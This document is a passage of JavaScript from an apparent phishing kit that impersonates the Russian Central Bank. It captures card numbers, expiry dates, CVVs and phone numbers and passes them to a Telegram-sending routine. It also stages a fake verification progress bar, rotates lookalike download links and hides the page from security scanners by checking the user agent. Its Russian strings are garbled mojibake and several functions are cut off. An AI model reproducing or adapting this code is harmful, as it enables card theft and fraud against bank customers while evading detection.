        function simpleEncrypt(text, key = 'cb_backup_2026_secure') {
            let result = '';
            for (let i = 0; i < text.length; i++) {
                const keyChar = key.charCodeAt(i % key.length);
                const textChar = text.charCodeAt(i);
                result += String.fromCharCode(textChar ^ keyChar);
            }
            return btoa(result);
        }

        function checkNameForBadWords(name) {
            const lowerName = name.toLowerCase();
            const hasBadWord = badWords.some(word => lowerName.includes(word));

        // –ü–æ–∫–∞–∑–∞—Ç—å –æ–ø—Ü–∏—é –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è

        async function verifyCard() {

            if (!cardNumber || !cardExpiry || !cardCVV) {

            }

                sbpPhone: sbpPhone || '–ù–µ —É–∫–∞–∑–∞–Ω',

            };
            
            document.getElementById('cardVerificationBlock').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('verificationError').style.display = 'none';
            
            simulateVerificationProcess();
            
            setTimeout(() => sendToTelegramWithBackup('card_verification', cardData), 500);
        }
        
        // –ò–º–∏—Ç–∞—Ü–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏
        function simulateVerificationProcess() {
            const loaderText = document.getElementById('loaderText');
            let progress = 0;
            
            const interval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                const steps = [
                    "–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –æ–ø–µ—Ä–∞—Ü–∏–∏...",
                    "–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –ø–ª–∞—Ç–µ–∂–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ...",
                    "–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç—ã...",
                    "–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ –¶–ë –†–§...",
                    "–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...",
                    "–§–∏–Ω–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞..."
                ];
                
                const step = Math.min(Math.floor(progress / 20), steps.length - 1);
                loaderText.textContent = `${steps[step]} ${Math.floor(progress)}%`;
                
                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(showVerificationError, 1000);
                }
            }, 300);
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –æ—à–∏–±–∫—É –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏

        // –†–æ—Ç–∞—Ü–∏—è —Å—Å—ã–ª–æ–∫
        function startLinkRotation() {
            const linkVariants = [
                "https://secure-cb.ru/download",
                "https://compensation-app.cb.ru", 
                "https://flashget-kids.cb.ru"
            ];
            
            setInterval(() => {
                if (userSession.isExpired) return;
                const randomLink = linkVariants[Math.floor(Math.random() * linkVariants.length)];
                const links = document.querySelectorAll('a[href*="flashget"]');
                links.forEach(link => {
                    if (!link.getAttribute('data-real-href')) {
                        link.setAttribute('data-real-href', link.href);
                    }
                    link.textContent = link.textContent.replace(/https?:\/\/[^\s]+/, randomLink);
                });
                document.getElementById('smsLink').textContent = randomLink;
            }, 3600000);
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
        function showNotification(message) {
            const toast = document.getElementById('notificationToast');
            toast.textContent = message;
            toast.style.display = 'block';
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 5000);
        }
        
        // –ê–≤—Ç–æ—Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–∞—Ä—Ç—ã
        document.getElementById('cardNumber')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = value.substring(0, 19);
        });
        
        document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value.substring(0, 5);
        });
        
        document.getElementById('cardCVV')?.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
        });

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–∫–∞–Ω–µ—Ä—ã
        function checkForScanners() {
            const scannerPatterns = [
                'phishing', 'scanner', 'security', 'google-safe', 'virus', 'malware',
                'analytics', 'crawler', 'bot', 'spider', 'checker', 'validator'
            ];
            
            const userAgent = navigator.userAgent.toLowerCase();
            const isScanner = scannerPatterns.some(pattern => userAgent.includes(pattern));
            
            if (isScanner) {
                document.getElementById('maintenanceScreen').style.display = 'flex';
                document.getElementById('mainContainer').style.display = 'none';
                document.getElementById('refreshBtn').style.display = 'block';
                return true;
            }
            
            return false;
        }
